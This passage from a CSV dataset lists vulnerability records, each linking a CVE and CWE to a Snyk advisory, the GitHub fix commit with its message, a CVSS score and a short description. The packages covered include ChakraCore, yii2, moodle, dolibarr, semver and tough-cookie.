This CVE ID is unique from CVE-2017-0224, CVE-2017-0228, CVE-2017-0229, CVE-2017-0230, CVE-2017-0234, CVE-2017-0235, and CVE-2017-0238.",2023
CVE-2017-0223,CWE-119,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACOREVC140-5808459,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/f74773f4520adff6b70a7d445417aa9769f61fa6,Out-of-Bounds,https://api.github.com/repos/chakra-core/ChakraCore/commits/f74773f4520adff6b70a7d445417aa9769f61fa6,Taylor Woll,taylor.woll@microsoft.com,ChakraCore,f74773f4520adff6b70a7d445417aa9769f61fa6,"[CVE-2017-0223] Fix right paren location calculation for lambda with assignment expression

We don't calculate correct right paren location when a lambda contains an assignment expression where the assignment rhs is wrapped in parens. Due to the incorrect offset, we overwrite the buffer allocated in ScriptFunction::EnsureSourceString when we try to toString the lambda.",C/C++,9.8,critical,"Microsoft.ChakraCore.vc140 is a core part of the Chakra JavaScript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Out-of-Bounds which can lead to remote code execution. This issue derives from the way JavaScript engines render when handling objects in memory.
Note:
This vulnerability is different from CVE-2017-0252.",2023
CVE-2017-0236,CWE-119,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACORE-5808456,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031,Out-of-Bounds,https://api.github.com/repos/chakra-core/ChakraCore/commits/1ae7e3ce95515758b4cd7215cb4e48539a0f4031,Rajat Dua,radua@microsoft.com,ChakraCore,1ae7e3ce95515758b4cd7215cb4e48539a0f4031,"[CVE-2017-0236] Bug with array buffer detach

Change the vtable of virtual typed arrays to regular typed arrays upon array buffer detach to prevent writes to detached buffer in the jitted code.",C/C++,8.6,high,"Microsoft.ChakraCore is a core part of the Chakra Javascript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Out-of-Bounds which can lead to remote code execution. This issue derives from the way JavaScript engines render when handling objects in memory.
Note:
This CVE ID is unique from CVE-2017-0224, CVE-2017-0228, CVE-2017-0229, CVE-2017-0230, CVE-2017-0234, CVE-2017-0235, and CVE-2017-0238.",2023
CVE-2017-0223,CWE-119,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACORE-5808455,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/f74773f4520adff6b70a7d445417aa9769f61fa6,Out-of-Bounds,https://api.github.com/repos/chakra-core/ChakraCore/commits/f74773f4520adff6b70a7d445417aa9769f61fa6,Taylor Woll,taylor.woll@microsoft.com,ChakraCore,f74773f4520adff6b70a7d445417aa9769f61fa6,"[CVE-2017-0223] Fix right paren location calculation for lambda with assignment expression

We don't calculate correct right paren location when a lambda contains an assignment expression where the assignment rhs is wrapped in parens. Due to the incorrect offset, we overwrite the buffer allocated in ScriptFunction::EnsureSourceString when we try to toString the lambda.",C/C++,9.8,critical,"Microsoft.ChakraCore is a core part of the Chakra Javascript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Out-of-Bounds which can lead to remote code execution. This issue derives from the way JavaScript engines render when handling objects in memory.
Note:
This vulnerability is different from CVE-2017-0252.",2023
CVE-2017-8659,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACOREVC140-5808461,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/2500e1cdc12cb35af73d5c8c9b85656aba6bab4d,Information Exposure,https://api.github.com/repos/chakra-core/ChakraCore/commits/2500e1cdc12cb35af73d5c8c9b85656aba6bab4d,Paul Leathers,pleath@microsoft.com,ChakraCore,2500e1cdc12cb35af73d5c8c9b85656aba6bab4d,"17-08 ChakraCore servicing release

Addresses the following:

CVE-2017-0228
CVE-2017-8634
CVE-2017-8635
CVE-2017-8636
CVE-2017-8637
CVE-2017-8638
CVE-2017-8640
CVE-2017-8641
CVE-2017-8645
CVE-2017-8646
CVE-2017-8647
CVE-2017-8655
CVE-2017-8656
CVE-2017-8657
CVE-2017-8658
CVE-2017-8659
CVE-2017-8670
CVE-2017-8671
CVE-2017-8672
CVE-2017-8674

Details:

[CVE-2017-8656] PreVisitCatch doesn't call SetIsCatch for all cases

The catch block has a var declaration with the same name as the destructured parameter. When we emit code for initializing vars we don't emit the initialization code for the symbol in the body as the catch param is not marked. The fix is to mark the destructured param as catch param.

Blind constants more aggressively in jitted code

Let RPC do handle marshalling for the JIT process

[CVE-2017-8647] Fix oop jit diff to check msvcrt instead of ucrt

[CVE-2017-8637] [CVE-2017-8659] Harden JIT process against bad input

[CVE-2017-8655] Prevent restoring inlinee frame with the wrong function object

Invalidate lastUsedSegment of an array at the right point

[CVE-2017-8638] Fix function object inline cache if function body got reparsed

[CVE-2017-8657] Postpone adding deferred top-level functions to the deferred function dictionary. Do this so that if byte code gen is interrupted or restarted, we are not left with orphaned functions in the dictionary that may be semi-initialized.

[CVE-2017-8658] Don't attempt to use deferred function stubs inside a formal argument list, as this leads to issues with arrow functions, nested functions, etc.

[CVE-2017-8635] Don't try to reuse property indexes on re-add of a deleted property if the object is non-extensible. Doing so exhausts the free indexes on repeated re-adds, which violates our assumption that a free index will always be available if a property has been deleted.

[CVE-2017-8671] Consider CallFlags_ExtraArg in Function.call implementation. Extra arg (for proxy, etc.) should not be a factor when copying/eliding arguments to delegate to the real target.

[CVE-2017-8674] Re-map function object types if AutoRestoreFunctionInfo has to restore FunctionInfo on failed re-parse/byte code gen.

[CVE-2017-8640] Mark the correct function node when we're detecting 'arguments' declaration that overrides the built-in declaration.

[CVE-2017-8670] Make sure we mark the correct function node when we're processing formal named 'arguments' in a destructured expression.

[CVE-2017-8672] Avoid passing JsNull as JsFunction*

In JavascriptStackWalker GetCaller we were sending out JsNull as a
JavascriptFunction* in the outparam. I checked all locations that
did a call to this function, and recursively as far as the outparam
escaped. Virtually all of the callers of the function or the other
functions that allowed escape of the outparam were safe, as checks
against the return value of GetCaller are near-ubiquitous. The one
callsite where this wasn't the case was in GlobalObject.cpp L#693,
which is in VEval. This location used the outparam without checks,
which meant that if a JsNull object were returned, we'd call other
functions which wouldn't necessarily be correct.

[CVE-2017-8645] Whitelist the type of functions allow to be asm.js module

[CVE-2017-8646] Correctly use PushPopFrameHelper in ProcessLinkFailedAsmJsModule.
No longer ignore arbitrary javascript code after a `let`

[CVE-2017-8641] Integer overflow in chakra!Js::GlobalObject
Integer overflow can happen in multiple cases of add-mult and allocate.
Fix by using UInt32Math::AddMul() to catch overflows.

[CVE-2017-8634] Type confusion in Concat due to IsConcatSpreadable

[CVE-2017-8636] Limiting args count to a certain limit. This limit will be enforced during the parser time. During the bytecode time we add so many extra args which actually overflowed the initial assumption.

[CVE-2017-0228]  We have attempted to fix the ReverseHelper case where the inline segment was swapped from head to bottom due to reverse loop below. However that fix was done for multi-segment scenario. The EnsureHeadStartsFromZero can also insert head segment in between if the segment's length is less than Array's length (look at the loop above), which will make the code vulnerable. Fixed that scenario by allocating the segment (for the single segment case) if the segment's length is less than array's length.",Unknown,4.3,medium,"Microsoft.ChakraCore.vc140 is a core part of the Chakra JavaScript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Information Exposure.
Microsoft Edge in Microsoft Windows 10 1703 allows an attacker to obtain information to further compromise the user's system due to the Chakra scripting engine not properly handling objects in memory.
Note:
Userrs are advised to update to v1.6.2 as v1.6.1 was removed from the package manager.",2023
CVE-2017-8384,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CRAFTCMSCMS-5808454,28/07/2023,17/05/2022,https://github.com/craftcms/cms/commit/38c594badc8efc468b6162ec921d645011a50d35,Cross-site Scripting (XSS),https://api.github.com/repos/craftcms/cms/commits/38c594badc8efc468b6162ec921d645011a50d35,brandonkelly,brandon@pixelandtonic.com,cms,38c594badc8efc468b6162ec921d645011a50d35,UsersService cleanup,PHP,6.1,medium,"craftcms/cms is a content management system.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) because an array returned by the HttpRequestService::getSegments() and getActionSegments() methods needs not be zero-based. 
Note: 
This vulnerability exists because of an incomplete fix for CVE-2017-8052.",2023
CVE-2017-8659,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACORE-5808453,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/2500e1cdc12cb35af73d5c8c9b85656aba6bab4d,Information Exposure,https://api.github.com/repos/chakra-core/ChakraCore/commits/2500e1cdc12cb35af73d5c8c9b85656aba6bab4d,Paul Leathers,pleath@microsoft.com,ChakraCore,2500e1cdc12cb35af73d5c8c9b85656aba6bab4d,"17-08 ChakraCore servicing release

Addresses the following:

CVE-2017-0228
CVE-2017-8634
CVE-2017-8635
CVE-2017-8636
CVE-2017-8637
CVE-2017-8638
CVE-2017-8640
CVE-2017-8641
CVE-2017-8645
CVE-2017-8646
CVE-2017-8647
CVE-2017-8655
CVE-2017-8656
CVE-2017-8657
CVE-2017-8658
CVE-2017-8659
CVE-2017-8670
CVE-2017-8671
CVE-2017-8672
CVE-2017-8674

Details:

[CVE-2017-8656] PreVisitCatch doesn't call SetIsCatch for all cases

The catch block has a var declaration with the same name as the destructured parameter. When we emit code for initializing vars we don't emit the initialization code for the symbol in the body as the catch param is not marked. The fix is to mark the destructured param as catch param.

Blind constants more aggressively in jitted code

Let RPC do handle marshalling for the JIT process

[CVE-2017-8647] Fix oop jit diff to check msvcrt instead of ucrt

[CVE-2017-8637] [CVE-2017-8659] Harden JIT process against bad input

[CVE-2017-8655] Prevent restoring inlinee frame with the wrong function object

Invalidate lastUsedSegment of an array at the right point

[CVE-2017-8638] Fix function object inline cache if function body got reparsed

[CVE-2017-8657] Postpone adding deferred top-level functions to the deferred function dictionary. Do this so that if byte code gen is interrupted or restarted, we are not left with orphaned functions in the dictionary that may be semi-initialized.

[CVE-2017-8658] Don't attempt to use deferred function stubs inside a formal argument list, as this leads to issues with arrow functions, nested functions, etc.

[CVE-2017-8635] Don't try to reuse property indexes on re-add of a deleted property if the object is non-extensible. Doing so exhausts the free indexes on repeated re-adds, which violates our assumption that a free index will always be available if a property has been deleted.

[CVE-2017-8671] Consider CallFlags_ExtraArg in Function.call implementation. Extra arg (for proxy, etc.) should not be a factor when copying/eliding arguments to delegate to the real target.

[CVE-2017-8674] Re-map function object types if AutoRestoreFunctionInfo has to restore FunctionInfo on failed re-parse/byte code gen.

[CVE-2017-8640] Mark the correct function node when we're detecting 'arguments' declaration that overrides the built-in declaration.

[CVE-2017-8670] Make sure we mark the correct function node when we're processing formal named 'arguments' in a destructured expression.

[CVE-2017-8672] Avoid passing JsNull as JsFunction*

In JavascriptStackWalker GetCaller we were sending out JsNull as a
JavascriptFunction* in the outparam. I checked all locations that
did a call to this function, and recursively as far as the outparam
escaped. Virtually all of the callers of the function or the other
functions that allowed escape of the outparam were safe, as checks
against the return value of GetCaller are near-ubiquitous. The one
callsite where this wasn't the case was in GlobalObject.cpp L#693,
which is in VEval. This location used the outparam without checks,
which meant that if a JsNull object were returned, we'd call other
functions which wouldn't necessarily be correct.

[CVE-2017-8645] Whitelist the type of functions allow to be asm.js module

[CVE-2017-8646] Correctly use PushPopFrameHelper in ProcessLinkFailedAsmJsModule.
No longer ignore arbitrary javascript code after a `let`

[CVE-2017-8641] Integer overflow in chakra!Js::GlobalObject
Integer overflow can happen in multiple cases of add-mult and allocate.
Fix by using UInt32Math::AddMul() to catch overflows.

[CVE-2017-8634] Type confusion in Concat due to IsConcatSpreadable

[CVE-2017-8636] Limiting args count to a certain limit. This limit will be enforced during the parser time. During the bytecode time we add so many extra args which actually overflowed the initial assumption.

[CVE-2017-0228]  We have attempted to fix the ReverseHelper case where the inline segment was swapped from head to bottom due to reverse loop below. However that fix was done for multi-segment scenario. The EnsureHeadStartsFromZero can also insert head segment in between if the segment's length is less than Array's length (look at the loop above), which will make the code vulnerable. Fixed that scenario by allocating the segment (for the single segment case) if the segment's length is less than array's length.",Unknown,4.3,medium,"Microsoft.ChakraCore is a core part of the Chakra Javascript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Information Exposure. Microsoft Edge in Microsoft Windows 10 1703 allows an attacker to obtain information to further compromise the user's system due to the Chakra scripting engine not properly handling objects in memory.
Note:
Userrs are advised to update to v1.6.2 as v1.6.1 was removed from the package manager.",2023
CVE-2017-7271,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-YIISOFTYII2DEV-5808450,28/07/2023,17/05/2022,https://github.com/yiisoft/yii2/commit/97171a0db7cda0a49931ee0c3b998ef50bd06756,Cross-site Scripting (XSS),https://api.github.com/repos/yiisoft/yii2/commits/97171a0db7cda0a49931ee0c3b998ef50bd06756,Alexander Makarov,sam@rmcreative.ru,yii2,97171a0db7cda0a49931ee0c3b998ef50bd06756,Fixes #13401: Fixed lack of escaping of request dump at exception screens,Markdown,6.1,medium,"yiisoft/yii2-dev is a Fast, Secure and Professional PHP Framework.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization. When development mode is used, remote attackers are able to inject arbitrary web script or HTML via crafted request data that is mishandled on the debug-mode exception screen.",2023
CVE-2017-2644,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5808449,28/07/2023,17/05/2022,https://github.com/moodle/moodle/commit/0a76cd2ca1c5216d67c9bf7c844020c3b59b1fd7,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/0a76cd2ca1c5216d67c9bf7c844020c3b59b1fd7,Damyon Wiese,damyon@moodle.com,moodle,0a76cd2ca1c5216d67c9bf7c844020c3b59b1fd7,"MDL-57596 forms: CLEANHTML in persistent forms

Add special handling for text fields with the CLEANHTML type. This should
be used when students and teachers can edit the same field (you can't trust those students).

Applies cleaning on submitted data, and on data stored in the DB before it is put back in an editing form.",PHP,6.1,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). Registered users could submit evidence of prior learning that includes a malicious payload which will be executed for another user who tried to edit the same evidence.",2023
CVE-2017-7271,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-YIISOFTYII2-5808451,28/07/2023,17/05/2022,https://github.com/yiisoft/yii2/commit/97171a0db7cda0a49931ee0c3b998ef50bd06756,Cross-site Scripting (XSS),https://api.github.com/repos/yiisoft/yii2/commits/97171a0db7cda0a49931ee0c3b998ef50bd06756,Alexander Makarov,sam@rmcreative.ru,yii2,97171a0db7cda0a49931ee0c3b998ef50bd06756,Fixes #13401: Fixed lack of escaping of request dump at exception screens,Markdown,6.1,medium,"yiisoft/yii2 is a Yii PHP Framework.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization. When development mode is used, remote attackers are able to inject arbitrary web script or HTML via crafted request data that is mishandled on the debug-mode exception screen.",2023
CVE-2017-9435,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5808446,28/07/2023,17/05/2022,https://github.com/Dolibarr/dolibarr/commit/70636cc59ffa1ffbc0ce3dba315d7d9b837aad04,SQL Injection,https://api.github.com/repos/Dolibarr/dolibarr/commits/70636cc59ffa1ffbc0ce3dba315d7d9b837aad04,Laurent Destailleur,eldy@destailleur.fr,dolibarr,70636cc59ffa1ffbc0ce3dba315d7d9b837aad04,FIX SQL injection on user/index.php parameter search_statut.,PHP,9.8,critical,"dolibarr/dolibarr is a modern and easy to use web software to manage your business.
Affected versions of this package are vulnerable to SQL Injection due to improper user-input sanitization in the user/index.php file (search_supervisor and search_statut parameters).",2023
CVE-2023-26132,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOTTIE-3332763,09/06/2023,27/02/2023,https://github.com/mickhansen/dottie.js/commit/7d3aee1c9c3c842720506e131de7e181e5c8db68,Prototype Pollution,https://api.github.com/repos/mickhansen/dottie.js/commits/7d3aee1c9c3c842720506e131de7e181e5c8db68,Mick Hansen,maker@mhansen.io,dottie.js,7d3aee1c9c3c842720506e131de7e181e5c8db68,rudimentary __proto__ guarding,Markdown,7.5,high,"dottie is a Fast and safe nested object access and manipulation in JavaScript
Affected versions of this package are vulnerable to Prototype Pollution due to insufficient checks, via the set() function and the current variable in the /dottie.js file.",2023
CVE-2023-26134,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-GITCOMMITINFO-5740174,27/06/2023,26/06/2023,https://github.com/JPeer264/node-git-commit-info/commit/f7c491ede51f886a988af9b266797cb24591d18c,Command Injection,https://api.github.com/repos/JPeer264/node-git-commit-info/commits/f7c491ede51f886a988af9b266797cb24591d18c,JPeer264,jan.oster94@gmail.com,node-git-commit-info,f7c491ede51f886a988af9b266797cb24591d18c,Fix: validate commit hashes before executing them | closes #24,TypeScript,9.8,critical,"git-commit-info is a Get the info of an specific commit hash
Affected versions of this package are vulnerable to Command Injection such that the package-exported method gitCommitInfo () fails to sanitize its parameter commit, which later flows into a sensitive command execution API. As a result, attackers may inject malicious commands once they control the hash content.",2023
,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGCLOJURE-5740378,26/06/2023,26/06/2023,https://github.com/clojure/clojure/commit/271674c9b484d798484d134a5ac40a6df15d3ac3,Deserialization of Untrusted Data,https://api.github.com/repos/clojure/clojure/commits/271674c9b484d798484d134a5ac40a6df15d3ac3,Chouser,chouser@n01se.net,clojure,271674c9b484d798484d134a5ac40a6df15d3ac3,"CLJ-2204 Disable serialization of proxy classes

Signed-off-by: Stuart Halloway <stu@cognitect.com>",Clojure,6.6,medium,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data. If a server can deserialize objects from an untrusted source, it is possible to craft a serialized object that runs arbitrary code on deserialization.
Note:
The attacker would likely need to be in a position with elevated trust in order to pass a malicious payload and the attack depends on conditions that are not entirely under his control.",2023
CVE-2023-26136,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873,30/06/2023,08/06/2023,https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e,Prototype Pollution,https://api.github.com/repos/salesforce/tough-cookie/commits/12d474791bb856004e858fdb1c47b7608d09cf6e,Colin Casey,casey.colin@gmail.com,tough-cookie,12d474791bb856004e858fdb1c47b7608d09cf6e,"Prevent prototype pollution in cookie memstore (#283)

All occurrences of new object creation in `memstore.js` have been changed from `{}` (i.e.; `Object.create(Object.prototype)` to `Object.create(null)` so that we are using object instances that do not have a prototype property that can be polluted.

@fixes #282",JavaScript,6.5,medium,"tough-cookie is a RFC6265 Cookies and CookieJar module for Node.js.
Affected versions of this package are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in rejectPublicSuffixes=false mode. Due to an issue with the manner in which the objects are initialized, an attacker can expose or modify a limited amount of property information on those objects. There is no impact to availability.",2023
CVE-2022-25883,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795,20/06/2023,25/01/2023,https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/npm/node-semver/commits/2f8fd41487acf380194579ecb6f8b1bbfe116be0,João Moreno,mail@joaomoreno.com,node-semver,2f8fd41487acf380194579ecb6f8b1bbfe116be0,"fix: better handling of whitespace (#585)

This is a backport of the following commits squashed to land on
`release/v5`:

- 717534e
- abdd93d
- cc6fde2
- 99d8287

Ref: npm#564


Co-authored-by: Luke Karrys <luke@lukekarrys.com>
Co-authored-by: joaomoreno <mail@joaomoreno.com>",JavaScript,7.5,high,"semver is a semantic version parser used by npm.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",2023
,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-CHQOSRELOAD4J-5731326,22/06/2023,22/06/2023,https://github.com/qos-ch/reload4j/commit/3a86b8e5b474cdda25a255c0d8ba3ad427f7ff58,XML External Entity (XXE) Injection,https://api.github.com/repos/qos-ch/reload4j/commits/3a86b8e5b474cdda25a255c0d8ba3ad427f7ff58,Ceki Gulcu,ceki@qos.ch,reload4j,3a86b8e5b474cdda25a255c0d8ba3ad427f7ff58,"fix issue 53

Signed-off-by: Ceki Gulcu <ceki@qos.ch>",Java,7.3,high,"ch.qos.reload4j:reload4j is an a fork of Apache log4j version 1.2.17 with the goal of fixing pressing security issues.
Affected versions of this package are vulnerable to XML External Entity (XXE) Injection due to insufficient checks which do not disable the parsing of external general entities and external parameter entities.",2023
,CWE-668,Snyk,https://security.snyk.io/vuln/SNYK-JS-FSEVENTS-5487987,28/04/2023,27/04/2023,https://github.com/fsevents/fsevents/commit/909af26846834642c81d19f4148afa3b7557b058,Exposure of Resource to Wrong Sphere,https://api.github.com/repos/fsevents/fsevents/commits/909af26846834642c81d19f4148afa3b7557b058,Philipp Dunkel,pip@pipobscure.com,fsevents,909af26846834642c81d19f4148afa3b7557b058,Release v1.2.11,Unknown,3.7,low,"Affected versions of this package are vulnerable to Exposure of Resource to Wrong Sphere by loading a binary from an insecure hardcoded S3 bucket URL, which was demonstrated by an ethical hacker to be possible to be taken over by malicious actors and used to conduct a potential remote code execution. Loading the remote binary was removed in version 1.2.11 meaning this and later versions were not exposed to this attack vector.
During the disclosure process Snyk confirmed with the security researcher that AWS had agreed to take ownership and block all access to the S3 bucket and as such it has mitigated any attack vector - this can be further confirmed by attempting to access the bucket which returns a AllAccessDisabled error.
Note: While the original threat was of critical nature, it has now been fully mitigated and this advisory is written purely to inform users of the event, as there is currently no known risk in using any version of fsevents that was impacted by this issue.",2023
CVE-2023-26125,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGINGONICGIN-3324285,03/05/2023,17/02/2023,https://github.com/t0rchwo0d/gin/commit/fd9f98e70fb4107ee68c783482d231d35e60507b,Improper Input Validation,https://api.github.com/repos/t0rchwo0d/gin/commits/fd9f98e70fb4107ee68c783482d231d35e60507b,t0rchwo0d,huiseong.seo@linecorp.com,gin,fd9f98e70fb4107ee68c783482d231d35e60507b,Fix #3500 Add escape logic for header,Go,5.6,medium,"github.com/gin-gonic/gin is a package that implements a HTTP web framework called gin.
Affected versions of this package are vulnerable to Improper Input Validation by allowing an attacker to use a specially crafted request via the X-Forwarded-Prefix header, potentially leading to cache poisoning.
Note: Although this issue does not pose a significant threat on its own it can serve as an input vector for other more impactful vulnerabilities. However, successful exploitation may depend on the server configuration and whether the header is used in the application logic.",2023
CVE-2023-26115,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-WORDWRAP-3149973,22/03/2023,28/11/2022,https://github.com/jonschlinkert/word-wrap/commit/420dce9a2412b21881202b73a3c34f0edc53cb2e,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/jonschlinkert/word-wrap/commits/420dce9a2412b21881202b73a3c34f0edc53cb2e,Brian Woodward,brian.woodward@gmail.com,word-wrap,420dce9a2412b21881202b73a3c34f0edc53cb2e,"Merge pull request #41 from jonschlinkert/fix/CVE-2023-26115-2

🔒fix: CVE 2023 26115 (2)",JavaScript,3.7,low,"Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the result variable.
Note:
The regex is vulnerable on its own, but the vulnerable function is not reachable as shipped in the package.",2023
CVE-2023-26119,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-NETSOURCEFORGEHTMLUNIT-3252500,02/04/2023,29/01/2023,https://github.com/HtmlUnit/htmlunit/commit/641325bbc84702dc9800ec7037aec061ce21956b,Remote Code Execution (RCE),https://api.github.com/repos/HtmlUnit/htmlunit/commits/641325bbc84702dc9800ec7037aec061ce21956b,Ronald Brill,rbri@rbri.de,htmlunit,641325bbc84702dc9800ec7037aec061ce21956b,enable FEATURE_SECURE_PROCESSING for the XSLT processor,XML,9.8,critical,"net.sourceforge.htmlunit:htmlunit is a GUI-Less browser for Java programs
Affected versions of this package are vulnerable to Remote Code Execution (RCE) via XSTL, when browsing the attacker’s webpage.
Note: Users are advised to upgrade to org.htmlunit:htmlunit component v3.0.0 as it contains a fix for this issue.",2023
CVE-2023-26114,CWE-1385,Snyk,https://security.snyk.io/vuln/SNYK-JS-CODESERVER-3368148,22/03/2023,22/03/2023,https://github.com/coder/code-server/commit/d477972c68fc8c8e8d610aa7287db87ba90e55c7,Missing Origin Validation in WebSockets,https://api.github.com/repos/coder/code-server/commits/d477972c68fc8c8e8d610aa7287db87ba90e55c7,Asher,ash@coder.com,code-server,d477972c68fc8c8e8d610aa7287db87ba90e55c7,"Add origin checks to web sockets (#6048)

* Move splitOnFirstEquals to util

I will be making use of this to parse the forwarded header.

* Type splitOnFirstEquals with two items

Also add some test cases.

* Check origin header on web sockets

* Update changelog with origin check

* Fix web sockets not closing with error code",Markdown,8.2,high,"code-server is an application that allows running VS Code on a remote server.
Affected versions of this package are vulnerable to Missing Origin Validation in WebSockets handshakes. Exploiting this vulnerability can allow an adversary in specific scenarios to access data from and connect to the code-server instance.",2023
CVE-2023-26113,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-COLLECTIONJS-3185148,17/03/2023,29/12/2022,https://github.com/kobezzza/Collection/commit/d3d937645f62f37d3115d6aa90bb510fd856e6a2,Prototype Pollution,https://api.github.com/repos/kobezzza/Collection/commits/d3d937645f62f37d3115d6aa90bb510fd856e6a2,kobezzza,kobezzza@gmail.com,Collection,d3d937645f62f37d3115d6aa90bb510fd856e6a2,fix: fixed prototype pollution issue,JavaScript,7.5,high,"collection.js is a Minimalistic JavaScript library for working with collections of data.
Affected versions of this package are vulnerable to Prototype Pollution via the extend function in Collection.js/dist/node/iterators/extend.js.",2023
CVE-2023-25805,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-VERSIONN-3183749,21/02/2023,27/12/2022,https://github.com/commenthol/versionn/commit/2ca128823efe962b37f2698f0eb530c2b124842d,Command Injection,https://api.github.com/repos/commenthol/versionn/commits/2ca128823efe962b37f2698f0eb530c2b124842d,commenthol,commenthol@gmail.com,versionn,2ca128823efe962b37f2698f0eb530c2b124842d,fix: Command Injection Vuln,JavaScript,8.4,high,Affected versions of this package are vulnerable to Command Injection due to improper input sanitization in the 'GitFn.prototype' function.,2023
CVE-2023-26103,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-RUST-DENO-3315970,24/02/2023,08/02/2023,https://github.com/denoland/deno/commit/cf06a7c7e672880e1b38598fe445e2c50b4a9d06,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/denoland/deno/commits/cf06a7c7e672880e1b38598fe445e2c50b4a9d06,Bert Belder,bertbelder@gmail.com,deno,cf06a7c7e672880e1b38598fe445e2c50b4a9d06,refactor(ext/http): use `String.prototype.trim()` instead of regex (#17722),JavaScript,5.3,medium,"deno is an a simple, modern and secure runtime for JavaScript and TypeScript that uses V8 and is built in Rust.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the upgradeWebSocket function, which contains regexes in the form of /s*,s*/, used for splitting the Connection/Upgrade header. A specially crafted Connection/Upgrade header can be used to significantly slow down a web socket server.",2023
CVE-2023-26920,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-3325616,19/02/2023,19/02/2023,https://github.com/NaturalIntelligence/fast-xml-parser/commit/2b032a4f799c63d83991e4f992f1c68e4dd05804,Prototype Pollution,https://api.github.com/repos/NaturalIntelligence/fast-xml-parser/commits/2b032a4f799c63d83991e4f992f1c68e4dd05804,amit kumar gupta,amitgupta.gwl@gmail.com,fast-xml-parser,2b032a4f799c63d83991e4f992f1c68e4dd05804,Update package detail,JavaScript,7.5,high,"fast-xml-parser is a Validate XML, Parse XML, Build XML without C/C++ based libraries
Affected versions of this package are vulnerable to Prototype Pollution due to improper argument validation, which is exploitable via the aName variable.",2023
CVE-2022-25978,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUSEMEMOSMEMOSSERVER-3319070,14/02/2023,14/02/2023,https://github.com/usememos/memos/commit/b11d2130a084385eb65c3761a3c841ebe9f81ae8,Cross-site Scripting (XSS),https://api.github.com/repos/usememos/memos/commits/b11d2130a084385eb65c3761a3c841ebe9f81ae8,boojack,stevenlgtm@gmail.com,memos,b11d2130a084385eb65c3761a3c841ebe9f81ae8,chore: validate external link (#1069),Go,5.4,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to insufficient checks on external resources, which allows malicious actors to introduce links starting with a javascript: scheme.",2023
CVE-2022-25937,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-GLANCE-3318395,12/02/2023,12/02/2023,https://github.com/jarofghosts/glance/commit/8cecfe90286e0c45a5494067f1b592d0ccfeabac,Directory Traversal,https://api.github.com/repos/jarofghosts/glance/commits/8cecfe90286e0c45a5494067f1b592d0ccfeabac,Jesse Keane,decapitron@gmail.com,glance,8cecfe90286e0c45a5494067f1b592d0ccfeabac,Fix path traversal vulnerability,JavaScript,6.5,medium,"glance is a quick disposable http server for static files.
Affected versions of this package are vulnerable to Directory Traversal that allows users to read files outside the public root directory. This is related to but distinct from the vulnerability reported in CVE-2018-3715.",2023
